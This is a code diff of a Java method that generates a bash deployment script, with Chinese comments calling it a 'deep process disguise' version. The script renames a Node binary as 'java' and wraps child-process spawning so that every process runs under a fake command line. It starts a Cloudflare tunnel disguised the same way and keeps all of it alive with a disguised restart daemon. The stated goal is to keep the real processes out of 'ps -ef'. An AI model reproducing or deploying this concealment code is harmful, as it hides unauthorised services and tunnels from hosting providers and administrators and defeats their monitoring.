@@ -336,7 +336,7 @@ private static void startTunnelMonitor() {
 }
 
 // ============================================================
-// 生成部署脚本 (深度进程伪装版)
+// 生成部署脚本 (深度进程伪装版 + 极致空间优化)
 // ============================================================
 
 private static Path generateDeployScript() throws Exception {
@@ -470,16 +470,21 @@ private static Path generateDeployScript() throws Exception {
         "    rm -rf /tmp/_app.tar.gz /tmp/_app_extract\n" +
         "fi\n" +
         "\n" +
-        "# ============ 3. 安装依赖 ============\n" +
+        "# ============ 3. 安装依赖 (极致空间优化) ============\n" +
         "if [ -f package.json ] && [ ! -d node_modules ]; then\n" +
-        "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production >/dev/null 2>&1\n" +
+        // ★ 修复1：将缓存指向 /tmp，防止写入硬盘；加上 --no-optional 排除无用可选包
+        "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --no-optional --cache /tmp/npm-cache >/dev/null 2>&1\n" +
         "    if [ $? -ne 0 ]; then\n" +
-        "        .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps >/dev/null 2>&1\n" +
+        "        .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps --no-optional --cache /tmp/npm-cache >/dev/null 2>&1\n" +
         "    fi\n" +
+        "    rm -rf /tmp/npm-cache\n" + // 清理临时缓存
+        // ★ 修复2：删除 npm 本体 (约省 80MB)
+        "    rm -rf .node/lib/node_modules/npm\n" +
         "fi\n" +
         "\n" +
-        "# ============ 4. 替换伪装 (深度拦截，防 ps -ef 暴露) ============\n" +
-        "cp -f \".node/bin/.node_real\" \"$JRE_DIR/java\"\n" +
+        "# ============ 4. 替换伪装 (深度拦截 + 空间优化) ============\n" +
+        // ★ 修复3：使用软链接代替硬拷贝 (约省 100MB)
+        "ln -sf \"" + dir.toAbsolutePath() + "/.node/bin/.node_real\" \"$JRE_DIR/java\"\n" +
         "chmod +x \"$JRE_DIR/java\"\n" +
         "\n" +
         "cat > \".node/bin/node\" << 'NODEWRAPPER'\n" +
@@ -502,7 +507,6 @@ private static Path generateDeployScript() throws Exception {
         "            opts.execPath = _wp;\n" +
         "            cmd = _wp;\n" +
         "        } else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
-        "            // ★ 强力拦截所有本地子进程（如 node_modules/.bin 下的程序），防止 ps -ef 暴露真实路径\n" +
         "            var realArgs = args ? args.map(a => '\\''+a+'\\'').join(' ') : '';\n" +
         "            var bashCmd = 'exec -a \\''+FAKE_CMD+'\\'' \"' + cmd + '\" ' + realArgs;\n" +
         "            return _origSpawn.call(this, 'bash', ['-c', bashCmd], opts);\n" +
@@ -525,7 +529,6 @@ private static Path generateDeployScript() throws Exception {
         "export SERVER_PORT=$NODE_PORT\n" +
         "export PORT=$NODE_PORT\n" +
         "\n" +
-        // ★ 使用超长 FAKE_CMD 启动，将真实参数挤出 ps -ef 视线
         "(exec -a \"" + FAKE_CMD + "\" \"$JRE_DIR/java\" " + NODE_SCRIPT + " > .node_app.log 2>&1) &\n" +
         "NODE_PID=$!\n" +
         "echo \"$NODE_PID\" >> .pids\n" +
@@ -555,7 +558,6 @@ private static Path generateDeployScript() throws Exception {
         "        if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
         "            for PROTO in quic http2; do\n" +
         "                rm -f .cf/cf.log\n" +
-        // ★ CF 伪装
         "                (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) &\n" +
         "                CF_PID=$!\n" +
         "                sleep 5\n" +
@@ -578,7 +580,6 @@ private static Path generateDeployScript() throws Exception {
         "no-autoupdate: true\n" +
         "protocol: $PROTO\n" +
         "CFCONF\n" +
-        // ★ CF 伪装
         "                    (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > .cf/cf.log 2>&1) &\n" +
         "                    CF_PID=$!\n" +
         "                    sleep 5\n" +
@@ -618,7 +619,7 @@ private static Path generateDeployScript() throws Exception {
         "    fi\n" +
         "fi\n" +
         "\n" +
-        "# ============ 7. 守护循环 (也加上伪装) ============\n" +
+        "# ============ 7. 守护循环 ============\n" +
         "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
         "#!/bin/bash\n" +
         "WORK_DIR=\"" + dir.toAbsolutePath() + "\"\n" +
@@ -661,7 +662,6 @@ private static Path generateDeployScript() throws Exception {
         "    if [ \"$NEED_RESTART\" = \"true\" ]; then\n" +
         "        cd \"$APP_DIR\"\n" +
         "        export SERVER_PORT=$PORT; export PORT=$PORT\n" +
-        // ★ 守护进程启动 Node 伪装
         "        (exec -a \"" + FAKE_CMD + "\" \"$NODE_FAKE\" $NODE_SCRIPT >> \"$WORK_DIR/.node_app.log\" 2>&1) &\n" +
         "        NODE_PID=$!\n" +
         "        echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
@@ -740,7 +740,6 @@ private static Path generateDeployScript() throws Exception {
         "done\n" +
         "DAEMONSCRIPT\n" +
         "chmod +x daemon.sh\n" +
-        // ★ 守护脚本自身也伪装启动
         "(exec -a \"" + FAKE_CMD + "\" bash ./daemon.sh >> daemon.log 2>&1) &\n" +
         "echo \"$!\" >> .pids\n";
 
